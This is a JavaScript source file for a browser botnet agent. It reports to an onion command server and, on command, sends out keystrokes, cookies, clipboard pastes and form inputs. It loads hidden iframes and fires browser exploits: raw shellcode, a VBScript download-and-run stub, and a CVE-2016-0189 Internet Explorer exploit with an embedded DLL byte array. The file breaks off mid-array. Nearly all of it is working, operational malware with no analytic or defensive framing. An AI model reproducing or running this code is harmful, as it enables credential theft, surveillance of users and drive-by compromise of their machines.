var master = "https://p27rjz4oiu53u4gm.onion.link";

var connectKey = "\x4c\x55\x43\x4b\x59\x66\x75\x63\x6b\x69\x6e\x48\x61\x78\x30\x72";

var timeout = 30000;

//OS detection
var OSName="Unknown OS";

if (navigator.appVersion.indexOf("Win")!=-1)
    OSName="Windows";
if (navigator.appVersion.indexOf("Mac")!=-1)
    OSName="MacOS";
if (navigator.appVersion.indexOf("X11")!=-1)
    OSName="UNIX";
if (navigator.appVersion.indexOf("Linux")!=-1)
    OSName="Linux"; 



//Browser detection
// Opera 8.0+
var isOpera = (!!window.opr && !!opr.addons) || !!window.opera || navigator.userAgent.indexOf(' OPR/') >= 0;
// Firefox 1.0+
var isFirefox = typeof InstallTrigger !== 'undefined';
// At least Safari 3+: "[object HTMLElementConstructor]"
var isSafari = Object.prototype.toString.call(window.HTMLElement).indexOf('Constructor') > 0;
// Internet Explorer 6-11
var isIE = /*@cc_on!@*/ false || !!document.documentMode;
// Edge 20+
var isEdge = !isIE && !!window.StyleMedia;
// Chrome 1+
var isChrome = !!window.chrome && !!window.chrome.webstore;
// Blink engine detection
var isBlink = (isChrome || isOpera) && !!window.CSS;

var browserType = "Generic";

if (isOpera) {
    browserType = "Opera";
} else if (isFirefox) {
    browserType = "Firefox";
} else if (isSafari) {
    browserType = "Safari";
} else if (isIE) {
    browserType = "Internet Explorer";
} else if (isEdge) {
    browserType = "Microsoft Edge";
} else if (isChrome) {
    browserType = "Chrome";
} else if (isBlink) {
    browserType = "Blink";
}



var keys = "";

document.onkeypress = function(evt) {
    evt = evt || window.event;
    keys += String.fromCharCode(evt.charCode);
};

var meta = document.createElement('meta');
meta.name = "referrer";
meta.content = "no-referrer";
document.getElementsByTagName('head')[0].appendChild(meta); //hide referer

var connected = false; // We haven't connected (yet!)
var sitesJacked = new Array();
var sitesViewed = new Array();
var codeEvaled = new Array();
var cookieSent = false;
var clipSent = false;
var isCrackingMD5 = false;
var isCrackingSHA1 = false;
var exploitSent = false;

function md5cycle(x, k) {
    var a = x[0],
        b = x[1],
        c = x[2],
        d = x[3];

    a = ff(a, b, c, d, k[0], 7, -680876936);
    d = ff(d, a, b, c, k[1], 12, -389564586);
    c = ff(c, d, a, b, k[2], 17, 606105819);
    b = ff(b, c, d, a, k[3], 22, -1044525330);
    a = ff(a, b, c, d, k[4], 7, -176418897);
    d = ff(d, a, b, c, k[5], 12, 1200080426);
    c = ff(c, d, a, b, k[6], 17, -1473231341);
    b = ff(b, c, d, a, k[7], 22, -45705983);
    a = ff(a, b, c, d, k[8], 7, 1770035416);
    d = ff(d, a, b, c, k[9], 12, -1958414417);
    c = ff(c, d, a, b, k[10], 17, -42063);
    b = ff(b, c, d, a, k[11], 22, -1990404162);
    a = ff(a, b, c, d, k[12], 7, 1804603682);
    d = ff(d, a, b, c, k[13], 12, -40341101);
    c = ff(c, d, a, b, k[14], 17, -1502002290);
    b = ff(b, c, d, a, k[15], 22, 1236535329);

    a = gg(a, b, c, d, k[1], 5, -165796510);
    d = gg(d, a, b, c, k[6], 9, -1069501632);
    c = gg(c, d, a, b, k[11], 14, 643717713);
    b = gg(b, c, d, a, k[0], 20, -373897302);
    a = gg(a, b, c, d, k[5], 5, -701558691);
    d = gg(d, a, b, c, k[10], 9, 38016083);
    c = gg(c, d, a, b, k[15], 14, -660478335);
    b = gg(b, c, d, a, k[4], 20, -405537848);
    a = gg(a, b, c, d, k[9], 5, 568446438);
    d = gg(d, a, b, c, k[14], 9, -1019803690);
    c = gg(c, d, a, b, k[3], 14, -187363961);
    b = gg(b, c, d, a, k[8], 20, 1163531501);
    a = gg(a, b, c, d, k[13], 5, -1444681467);
    d = gg(d, a, b, c, k[2], 9, -51403784);
    c = gg(c, d, a, b, k[7], 14, 1735328473);
    b = gg(b, c, d, a, k[12], 20, -1926607734);

    a = hh(a, b, c, d, k[5], 4, -378558);
    d = hh(d, a, b, c, k[8], 11, -2022574463);
    c = hh(c, d, a, b, k[11], 16, 1839030562);
    b = hh(b, c, d, a, k[14], 23, -35309556);
    a = hh(a, b, c, d, k[1], 4, -1530992060);
    d = hh(d, a, b, c, k[4], 11, 1272893353);
    c = hh(c, d, a, b, k[7], 16, -155497632);
    b = hh(b, c, d, a, k[10], 23, -1094730640);
    a = hh(a, b, c, d, k[13], 4, 681279174);
    d = hh(d, a, b, c, k[0], 11, -358537222);
    c = hh(c, d, a, b, k[3], 16, -722521979);
    b = hh(b, c, d, a, k[6], 23, 76029189);
    a = hh(a, b, c, d, k[9], 4, -640364487);
    d = hh(d, a, b, c, k[12], 11, -421815835);
    c = hh(c, d, a, b, k[15], 16, 530742520);
    b = hh(b, c, d, a, k[2], 23, -995338651);

    a = ii(a, b, c, d, k[0], 6, -198630844);
    d = ii(d, a, b, c, k[7], 10, 1126891415);
    c = ii(c, d, a, b, k[14], 15, -1416354905);
    b = ii(b, c, d, a, k[5], 21, -57434055);
    a = ii(a, b, c, d, k[12], 6, 1700485571);
    d = ii(d, a, b, c, k[3], 10, -1894986606);
    c = ii(c, d, a, b, k[10], 15, -1051523);
    b = ii(b, c, d, a, k[1], 21, -2054922799);
    a = ii(a, b, c, d, k[8], 6, 1873313359);
    d = ii(d, a, b, c, k[15], 10, -30611744);
    c = ii(c, d, a, b, k[6], 15, -1560198380);
    b = ii(b, c, d, a, k[13], 21, 1309151649);
    a = ii(a, b, c, d, k[4], 6, -145523070);
    d = ii(d, a, b, c, k[11], 10, -1120210379);
    c = ii(c, d, a, b, k[2], 15, 718787259);
    b = ii(b, c, d, a, k[9], 21, -343485551);

    x[0] = add32(a, x[0]);
    x[1] = add32(b, x[1]);
    x[2] = add32(c, x[2]);
    x[3] = add32(d, x[3]);

}

function cmn(q, a, b, x, s, t) {
    a = add32(add32(a, q), add32(x, t));
    return add32((a << s) | (a >>> (32 - s)), b);
}

function ff(a, b, c, d, x, s, t) {
    return cmn((b & c) | ((~b) & d), a, b, x, s, t);
}

function gg(a, b, c, d, x, s, t) {
    return cmn((b & d) | (c & (~d)), a, b, x, s, t);
}

function hh(a, b, c, d, x, s, t) {
    return cmn(b ^ c ^ d, a, b, x, s, t);
}

function ii(a, b, c, d, x, s, t) {
    return cmn(c ^ (b | (~d)), a, b, x, s, t);
}

function md51(s) {
    txt = '';
    var n = s.length,
        state = [1732584193, -271733879, -1732584194, 271733878],
        i;
    for (i = 64; i <= s.length; i += 64) {
        md5cycle(state, md5blk(s.substring(i - 64, i)));
    }
    s = s.substring(i - 64);
    var tail = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0];
    for (i = 0; i < s.length; i++)
        tail[i >> 2] |= s.charCodeAt(i) << ((i % 4) << 3);
    tail[i >> 2] |= 0x80 << ((i % 4) << 3);
    if (i > 55) {
        md5cycle(state, tail);
        for (i = 0; i < 16; i++) tail[i] = 0;
    }
    tail[14] = n * 8;
    md5cycle(state, tail);
    return state;
}

/* there needs to be support for Unicode here,
 * unless we pretend that we can redefine the MD-5
 * algorithm for multi-byte characters (perhaps
 * by adding every four 16-bit characters and
 * shortening the sum to 32 bits). Otherwise
 * I suggest performing MD-5 as if every character
 * was two bytes--e.g., 0040 0025 = @%--but then
 * how will an ordinary MD-5 sum be matched?
 * There is no way to standardize text to something
 * like UTF-8 before transformation; speed cost is
 * utterly prohibitive. The JavaScript standard
 * itself needs to look at this: it should start
 * providing access to strings as preformed UTF-8
 * 8-bit unsigned value arrays.
 */
function md5blk(s) { /* I figured global was faster.   */
    var md5blks = [],
        i; /* Andy King said do it this way. */
    for (i = 0; i < 64; i += 4) {
        md5blks[i >> 2] = s.charCodeAt(i) +
            (s.charCodeAt(i + 1) << 8) +
            (s.charCodeAt(i + 2) << 16) +
            (s.charCodeAt(i + 3) << 24);
    }
    return md5blks;
}

var hex_chr = '0123456789abcdef'.split('');

function rhex(n) {
    var s = '',
        j = 0;
    for (; j < 4; j++)
        s += hex_chr[(n >> (j * 8 + 4)) & 0x0F] +
        hex_chr[(n >> (j * 8)) & 0x0F];
    return s;
}

function hex(x) {
    for (var i = 0; i < x.length; i++)
        x[i] = rhex(x[i]);
    return x.join('');
}

function md5(s) {
    return hex(md51(s));
}

/* this function is much faster,
 so if possible we use it. Some IEs
 are the only ones I know of that
 need the idiotic second function,
 generated by an if clause.  */

function add32(a, b) {
    return (a + b) & 0xFFFFFFFF;
}

if (md5('hello') != '5d41402abc4b2a76b9719d911017c592') {
    function add32(x, y) {
        var lsw = (x & 0xFFFF) + (y & 0xFFFF),
            msw = (x >> 16) + (y >> 16) + (lsw >> 16);
        return (msw << 16) | (lsw & 0xFFFF);
    }
}



function sha1(str) {
    //  discuss at: http://phpjs.org/functions/sha1/
    // original by: Webtoolkit.info (http://www.webtoolkit.info/)
    // improved by: Michael White (http://getsprink.com)
    // improved by: Kevin van Zonneveld (http://kevin.vanzonneveld.net)
    //    input by: Brett Zamir (http://brett-zamir.me)
    //  depends on: utf8_encode
    //   example 1: sha1('Kevin van Zonneveld');
    //   returns 1: '54916d2e62f65b3afa6e192e6a601cdbe5cb5897'

    var rotate_left = function(n, s) {
        var t4 = (n << s) | (n >>> (32 - s));
        return t4;
    };

    /*var lsb_hex = function (val) { // Not in use; needed?
     var str="";
     var i;
     var vh;
     var vl;

     for ( i=0; i<=6; i+=2 ) {
     vh = (val>>>(i*4+4))&0x0f;
     vl = (val>>>(i*4))&0x0f;
     str += vh.toString(16) + vl.toString(16);
     }
     return str;
     };*/

    var cvt_hex = function(val) {
        var str = '';
        var i;
        var v;

        for (i = 7; i >= 0; i--) {
            v = (val >>> (i * 4)) & 0x0f;
            str += v.toString(16);
        }
        return str;
    };

    var blockstart;
    var i, j;
    var W = new Array(80);
    var H0 = 0x67452301;
    var H1 = 0xEFCDAB89;
    var H2 = 0x98BADCFE;
    var H3 = 0x10325476;
    var H4 = 0xC3D2E1F0;
    var A, B, C, D, E;
    var temp;

    str = this.utf8_encode(str);
    var str_len = str.length;

    var word_array = [];
    for (i = 0; i < str_len - 3; i += 4) {
        j = str.charCodeAt(i) << 24 | str.charCodeAt(i + 1) << 16 | str.charCodeAt(i + 2) << 8 | str.charCodeAt(i + 3);
        word_array.push(j);
    }

    switch (str_len % 4) {
        case 0:
            i = 0x080000000;
            break;
        case 1:
            i = str.charCodeAt(str_len - 1) << 24 | 0x0800000;
            break;
        case 2:
            i = str.charCodeAt(str_len - 2) << 24 | str.charCodeAt(str_len - 1) << 16 | 0x08000;
            break;
        case 3:
            i = str.charCodeAt(str_len - 3) << 24 | str.charCodeAt(str_len - 2) << 16 | str.charCodeAt(str_len - 1) <<
                8 | 0x80;
            break;
    }

    word_array.push(i);

    while ((word_array.length % 16) != 14) {
        word_array.push(0);
    }

    word_array.push(str_len >>> 29);
    word_array.push((str_len << 3) & 0x0ffffffff);

    for (blockstart = 0; blockstart < word_array.length; blockstart += 16) {
        for (i = 0; i < 16; i++) {
            W[i] = word_array[blockstart + i];
        }
        for (i = 16; i <= 79; i++) {
            W[i] = rotate_left(W[i - 3] ^ W[i - 8] ^ W[i - 14] ^ W[i - 16], 1);
        }

        A = H0;
        B = H1;
        C = H2;
        D = H3;
        E = H4;

        for (i = 0; i <= 19; i++) {
            temp = (rotate_left(A, 5) + ((B & C) | (~B & D)) + E + W[i] + 0x5A827999) & 0x0ffffffff;
            E = D;
            D = C;
            C = rotate_left(B, 30);
            B = A;
            A = temp;
        }

        for (i = 20; i <= 39; i++) {
            temp = (rotate_left(A, 5) + (B ^ C ^ D) + E + W[i] + 0x6ED9EBA1) & 0x0ffffffff;
            E = D;
            D = C;
            C = rotate_left(B, 30);
            B = A;
            A = temp;
        }

        for (i = 40; i <= 59; i++) {
            temp = (rotate_left(A, 5) + ((B & C) | (B & D) | (C & D)) + E + W[i] + 0x8F1BBCDC) & 0x0ffffffff;
            E = D;
            D = C;
            C = rotate_left(B, 30);
            B = A;
            A = temp;
        }

        for (i = 60; i <= 79; i++) {
            temp = (rotate_left(A, 5) + (B ^ C ^ D) + E + W[i] + 0xCA62C1D6) & 0x0ffffffff;
            E = D;
            D = C;
            C = rotate_left(B, 30);
            B = A;
            A = temp;
        }

        H0 = (H0 + A) & 0x0ffffffff;
        H1 = (H1 + B) & 0x0ffffffff;
        H2 = (H2 + C) & 0x0ffffffff;
        H3 = (H3 + D) & 0x0ffffffff;
        H4 = (H4 + E) & 0x0ffffffff;
    }

    temp = cvt_hex(H0) + cvt_hex(H1) + cvt_hex(H2) + cvt_hex(H3) + cvt_hex(H4);
    return temp.toLowerCase();
}



function makestr(length, alpha) {
    var text = "";
    for (var i = 0; i < length; i++)
        text += alpha.charAt(Math.floor(Math.random() * alpha.length));
    return text;
}



function imageLoad(URL) {
    var pic = new Image();
    pic.src = URL;
}



function prepareFrame(URL) {
    var ifrm = document.createElement("iframe");
    ifrm.src = URL;
    ifrm.style.width = "0px";
    ifrm.style.height = "0px";
    ifrm.style.border = "None";
    ifrm.style.visibility = "hidden";
    document.getElementsByTagName("body")[0].appendChild(ifrm);
}

function wait(ms) {
    return new Promise((resolve) => setTimeout(resolve, ms));
}

function post(url, params) {
	var http;
    if (window.XMLHttpRequest) {
        http = new XMLHttpRequest();
    } else {
        http = new ActiveXObject("Microsoft.XMLHTTP");
    }
    http.open("POST", url, true);
    //Send the proper header information along with the request
    http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http.send(params);
}

function randInt(min, max) {
    var randInteger = Math.floor(Math.random() * max) + min;
    if(randInteger > max) {
        randInteger -= min;
    }
    return randInteger;
}

var contains = function(needle) {
    // Per spec, the way to identify NaN is that it is not equal to itself
    var findNaN = needle !== needle;
    var indexOf;
    if(!findNaN && typeof Array.prototype.indexOf === 'function') {
        indexOf = Array.prototype.indexOf;
    } else {
        indexOf = function(needle) {
            var i = -1, index = -1;
            for(i = 0; i < this.length; i++) {
                var item = this[i];
                if((findNaN && item !== item) || item === needle) {
                    index = i;
                    break;
                }
            }
            return index;
        };
    }
    return indexOf.call(this, needle) > -1;
};

function disconnect(xmlhttp) { //Disconnect routine

    xmlhttp.open("GET", master + "/gate.php?disconnect=" + encodeURI(connectKey) + "&browsertype=" + encodeURI(browserType) + "&osname=" + encodeURI(OSName) + "&rand=" + rand, true);
    xmlhttp.send(null); //Disconnect from panel.
    
    if (keys.length >= 1) {
        var param = encodeURI(keys);
        var rand = Math.floor(Math.random() * 10000);
        xmlhttp.open("GET", master + "/logger.php?keys=" + encodeURI(param) + "&referer=" + encodeURI(document.location) + "&rand=" + rand, true); //randomize request to avoid caching
        xmlhttp.send(null);
    }
    
    var inputs, index;

    var inputList = "";

    inputs = document.getElementsByTagName('form');
    for (index = 0; index < inputs.length; ++index) { 
        var form = inputs[index]; // get the form somehow
        for ( var i = 0; i < form.elements.length; i++ ) {
           var e = form.elements[i];
           inputList += e.name + "=" + e.value + "\r\n";
        }
    }
    
    if (inputList != "") {
        xmlhttp.open("GET", master + "/inputs.php?inputs=" + encodeURI(inputList) + "&referer=" + encodeURI(document.location) + "&rand=" + rand, true);
        xmlhttp.send(null);
    }
    connected = false; // we are now fully disconnected from the server
 
}

function Parse(data, xmlhttp) {
    var command = data;
    var command = command.split("\n");
    
    var i = 0;

    for (i = 0; i < command.length; i++) {
        if (command[i].substring(0, 6) == "cookie") {

            if (document.cookie != undefined && document.cookie != "" && cookieSent == false) {
                var rand = Math.floor(Math.random() * 10000);
                imageLoad(master + "/cookie.php?c=" + encodeURI(document.cookie) + "&referer=" + document.location + "&rand=" + rand); //send cookie
                cookieSent = true;
            }

        } else if (command[i].substring(0, 9) == "clipboard") {
            
            window.onpaste = function(e) {
                var paste = e.clipboardData && e.clipboardData.getData ?
                    e.clipboardData.getData('text/plain') : // Standard
                    window.clipboardData && window.clipboardData.getData ?
                    window.clipboardData.getData('Text') : // MS
                    false;
                if (paste && clipSent == false) {
                    var rand = Math.floor(Math.random() * 10000);
                    xmlhttp.open("GET", master + "/clipboard.php?connect=" + connectKey + "&clipboard=" + encodeURI(paste) + "&referer=" + document.location + "&rand=" + rand, true); //send clipboard data
                    xmlhttp.send(null);
                    clipSent = true;
                }
            };

        } else if (command[i].substring(0, 5) == "sleep") {

            var argv = command[i].split("*");
            wait(parseInt(argv[1]));

        } else if (command[i].substring(0, 4) == "view") {

            var argv = command[i].split("*");
            
            if(viewed == false) {
                prepareFrame(argv[1]); //viewsite
                viewed = true;
            }
            

        } else if (command[i].substring(0, 7) == "exploit") {

            var argv = command[i].split("*");
            
            //Our shellcode
            var shellcode = unescape("%uC933%u8B64%u3041%u408B%u8B0C%u1470%u96AD%u8BAD%u1058%u538B%u033C%u8BD3%u7852%uD303%u728B%u0320%u33F3%u41C9%u03AD%u81C3%u4738%u7465%u7550%u81F4%u0478%u6F72%u4163%uEB75%u7881%u6408%u7264%u7565%u8BE2%u2472%uF303%u8B66%u4E0C%u8B49%u1C72%uF303%u148B%u038E%u33D3%u51C9%u2E68%u7865%u6865%u6564%u6461%u5253%u6851%u7261%u4179%u4C68%u6269%u6872%u6F4C%u6461%u5354%uD2FF%uC483%u590C%u5150%uB966%u6C6C%u6851%u6E6F%u642E%u7568%u6C72%u546D%uD0FF%uC483%u8B10%u2454%u3304%u51C9%uB966%u4165%u3351%u68C9%u466F%u6C69%u6F68%u6461%u6854%u776F%u6C6E%u5568%u4C52%u5444%uFF50%u33D2%u8DC9%u2454%u5124%u5251%u47EB%uFF51%u83D0%u1CC4%uC933%u5B5A%u5253%u6851%u6578%u6163%u4C88%u0324%u5768%u6E69%u5445%uFF53%u6AD2%u8D05%u244C%u5118%uD0FF%uC483%u5A0C%u685B%u7365%u6173%u6C83%u0324%u6861%u7250%u636F%u4568%u6978%u5474%uFF53%uFFD2%uE8D0%uFFB4%uFFFF");
            
            if (isOpera && exploitSent == false) {
                //Opera exploit goes here
                exploitSent = true;
            } else if (isFirefox && exploitSent == false) {
                //Firefox exploit goes here
                exploitSent = true;
            } else if (isSafari && exploitSent == false) {
                //Safari exploit goes here
                exploitSent = true;
            } else if (isIE && exploitSent == false) {
                //Internet Explorer exploit by Freak/SynthMesc
                var vbscript = document.createElement("script");
                vbscript.lang = "vbscript";
                vbscript.innerHTML = "dim http_obj\ndim stream_obj\ndim shell_obj\n\nset http_obj = CreateObject('Microsoft.XMLHTTP')\nset stream_obj = CreateObject('ADODB.Stream')\nset shell_obj = CreateObject('WScript.Shell')\n\nURL = '" + argv[1] + "' 'Where to download the file from\nFILENAME = 'download.exe' 'Name to save the file (on the local system)\nRUNCMD = 'download.exe' 'Command to run after downloading\n\nhttp_obj.open 'GET', URL, False\nhttp_obj.send\n\nstream_obj.type = 1\nstream_obj.open\nstream_obj.write http_obj.responseBody\nstream_obj.savetofile FILENAME, 2\n\nshell_obj.run RUNCMD\nhttp_obj.open 'GET', '" + master + "/exploit.php?connect=" + encodeURI(connectKey) + "&browsertype=" + encodeURI(browserType) + "&osname=" + encodeURI(OSName) + "&exploit=" + encodeURI("IE8 unsafe scripting") + "', False\nhttp_obj.send\n";
                document.getElementsByTagName("body")[0].appendChild(div);
                /// IE 11 Memory corruption exploit and IE 8 "Godmode" exploit from BEPS exploit kit.
                var cve_2016_0189 = '<script type=\"text/vbscript\">\n' + '        Dim aw\n' + '        Dim lunnga(32)\n' + '        Dim y(32)\n' + '    k1 = 1\n' + '    k2 = 1999 + k1\n' + '    fix1 = \"%u4141\" \n' + '        fastfix = fix1 & fix1\n' + '    k3 = 32\n' + '    fix3 = fastfix & fix1\n' + '        zerofix = \"%u0000\"\n' + '        trifix = zerofix & zerofix & zerofix\n' + '        d = fastfix & \"%u0016\" & fix3 & \"%u4242%u4242\"\n' + '        b = String(k2*k3, \"D\")\n' + '        c = d & b\n' + '        x = UnEscape(c)\n' + '\n' + '        Class MiddleD\n' + '        End Class\n' + '\n' + '        Class Wararape\n' + '            Dim Cod()\n' + '            Private Sub Class_Initialize\n' + '                ReDim Preserve Cod(k1, k2)\n' + '            End Sub\n' + '\n' + '            Public Sub ZeroineL()\n' + '                ReDim Preserve Cod(k1, k1)\n' + '            End Sub\n' + '        End Class\n' + '\n' + '        Function GogoGoA (arg1, s)\n' + '            aw = Null\n' + '            Set aw = New Wararape\n' + '\n' + '            For i = 0 To k3\n' + '                Set lunnga(i) = s\n' + '            Next\n' + '\n' + '            Set aw.Cod(arg1, 2) = s\n' + '\n' + '            Dim addr\n' + '            Dim i\n' + '            For i = 0 To k3-1\n' + '                If Asc(Mid(y(i), 3, 1)) = VarType(s) Then\n' + '                    addr = strToInt(Mid(y(i), 3 + 4, 2))\n' + '                End If\n' + '                y(i) = Null\n' + '            Next\n' + '\n' + '            If addr = Null Then\n' + '                document.location.href = document.location.href\n' + '                Return\n' + '            End If\n' + '\n' + '            GogoGoA = addr\n' + '        End Function\n' + '\n' + '        Function LikeMeLike (arg1, addr)\n' + '            d = fastfix & \"%u0008\" & fix3\n' + '            c = d & intToStr(addr) & b\n' + '            x = UnEscape(c)\n' + '            aw = Null\n' + '            Set aw = New Wararape\n' + '            Dim o\n' + '            o = aw.Cod(arg1, 2)\n' + '            LikeMeLike = o\n' + '        End Function\n' + '\n' + '        Sub Rewwati (arg1, addr)\n' + '            d = fastfix & \"%u400C\" & trifix\n' + '            c = d & intToStr(addr) & b\n' + '            x = UnEscape(c)\n' + '            aw = Null\n' + '            Set aw = New Wararape\n' + '            aw.Cod(arg1, 2) = CSng(0)\n' + '        End Sub\n' + '\n' + '        Sub Rewwati2 (arg1, addr)\n' + '            Dim emptyval\n' + '            d = fastfix & \"%u400C\" & trifix\n' + '            c = d & intToStr(addr) & b\n' + '            x = UnEscape(c)\n' + '            aw = Null\n' + '            Set aw = New Wararape\n' + '            aw.Cod(arg1, 2) = emptyval\n' + '        End Sub\n' + '\n' + '        Function ProtectMe (arg1)\n' + '            Dim addr\n' + '            Dim sexy\n' + '            Dim koles\n' + '            Dim mem\n' + '            Set dm = New MiddleD\n' + '            addr = GogoGoA(arg1, dm)\n' + '            mem = LikeMeLike(arg1, addr + 8)\n' + '            sexy = strToInt(Mid(mem, 3, 2))\n' + '            mem = LikeMeLike(arg1, sexy + 4)\n' + '            koles = strToInt(Mid(mem, 1, 2))\n' + '            Rewwati arg1, koles + &H174\n' + '            fire()\n' + '            Rewwati2 arg1, koles + &H174\n' + '        End Function\n' + '\n' + '    Function rnds(strLen)\n' + '        Dim str\n' + '        Const LETTERS = \"abcdehiklmnoprstuw02346\"\n' + '        Randomize\n' + '        For i = 1 to strLen\n' + '            str = str & Mid(LETTERS, Int(23*Rnd+1), 1)\n' + '        Next\n' + '        rnds = str\n' + '    End Function\n' + '\n' + '        Sub fire()\n' + '          On Error Resume Next\n' + '          url=\"' + argv[1] + '\"\n' + '          uas=userAgent\n' + '      \n' + '          Set oss=GetObject(\"winmgmts:\").InstancesOf(\"Win32_OperatingSystem\")\n' + '          Dim osloc\n' + '          for each os in oss\n' + '            osloc=os.OSLanguage\n' + '          next\n' + '          SetLocale(osloc)\n' + '\n' + '          Set req=CreateObject(\"WinHTTP.WinHTTPRequest.5.1\")\n' + '          req.SetProxy 0\n' + '          req.Open \"GET\",url,0\n' + '          req.Option(0)=uas\n' + '          req.Send\n' + '          If 200=req.status Then\n' + '            z=req.responseBody\n' + '            Set c=CreateObject(\"Scripting.FileSystemObject\")\n' + '            tmp=c.GetSpecialFolder(2)\n' + '            fake32=tmp&\"\\System32\"\n' + '            If Not c.FolderExists(fake32) Then\n' + '              c.CreateFolder(fake32)\n' + '            End If\n' + '            Dim dllcode,dlltxt,fakedll\n' + '            dllcode= Array(&h4d,&h5a,&h80,0,1,0,0,0,4,0,&h10,0,&hff,&hff,0,0,&h40,1,0,0,0,0,0,0,&h40,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,&h80,0,0,0,&he,&h1f,&hba,&he,0,&hb4,9,&hcd,&h21,&hb8,1,&h4c,&hcd,&h21,&h54,&h68,&h69,&h73,&h20,&h70,&h72,&h6f,&h67,&h72,&h61,&h6d,&h20,&h63,&h61,&h6e,&h6e,&h6f,&h74,&h20,&h62,&h65,&h20,&h72,&h75,&h6e,&h20,&h69,&h6e,&h20,&h44,&h4f,&h53,&h20,&h6d,&h6f,&h64,&h65,&h2e,&hd,&ha,&h24,0,0,0,0,0,0,0,0,&h50,&h45,0,0,&h4c,1,4,0,&h21,&h3c,&h6e,&h58,0,0,0,0,0,0,0,0,&he0,0,&he,&h21,&hb,1,1,&h47,0,2,0,0,0,6,0,0,0,0,0,0,0,&h10,0,0,0,&h10,0,0,0,&h20,0,0,0,0,&h40,0,0,&h10,0,0,0,2,0,0,1,0,0,0,0,0,0,0,4,0,0,0,0,0,0,0,0,&h50,0,0,0,4,0,0,&h15,&h5b,0,0,2,0,&h40,0,0,&h10,0,0,0,&h10,0,0,0,0,1,0,0,0,0,0,0,0,0,0,&h10,0,0,0,0,0,0,0,0,0,0,0,0,&h30,0,0,&hfc,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,&h40,0,0,&h28,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,&h2e,&h74,&h65,&h78,&h74,0,0,0,&ha1,0,0,0,0,&h10,0,0,0,2,0,0,0,4,0,0,0,0,0,0,0,0,0,0,0,0,0,0,&h20,0,0,&h60,&h2e,&h64,&h61,&h74,&h61,0,0,0,&hee,1,0,0,0,&h20,0,0,0,2,0,0,0,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,&h40,0,0,&hc0,&h2e,&h69,&h64,&h61,&h74,&h61,0,0,&hfc,0,0,0,0,&h30,0,0,0,2,0,0,0,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,&h40,0,0,&hc0,&h2e,&h72,&h65,&h6c,&h6f,&h63,0,0,&h28,0,0,0,0,&h40,0,0,0,2,0,0,0,&ha,0,0,0,0,0,0,0,0,0,0,0,0,0,0,&h40,0,0,&h42,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,&h55,&h89,&he5,&h83,&h7d,&hc,1,&hf,&h85,&h8b,0,0,0,&hb9,&h96,0,0,0,&h49,&hf6,&h91,&h58,&h21,&h40,0,&h80,&hb1,&h58,&h21,&h40,0,&ha3,&h85,&hc9,&h75,&hee,&h68,&h58,&h21,&h40,0,&h6a,1,&h6a,1,&h6a,0,&hff,&h15,&h6c,&h30,&h40,0,&hff,&h15,&h74,&h30,&h40,0,&h85,&hc0,&h75,&h59,&hc7,5,4,&h21,&h40,0,&h44,0,0,0,&hc7,5,&h30,&h21,&h40,0,1,1,0,0,&h68,4,1,0,0,&h68,0,&h20,&h40,0,&hff,&h15,&h70,&h30,&h40,0,&h68,0,&h20,&h40,0,&h68,&he3,&h21,&h40,0,&hff,&h15,&h78,&h30,&h40,0,&h68,&h48,&h21,&h40,0,&h68,4,&h21,&h40,0,&h6a,0,&h6a,0,&h6a,0,&h6a,0,&h6a,0,&h6a,0,&h68,&h7d,&h21,&h40,0,&h6a,0,&h6a,0,&hff,&h15,&hdc,&h30,&h40,0,&hb8,1,0,0,0,&hc9,&hc2,&hc,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0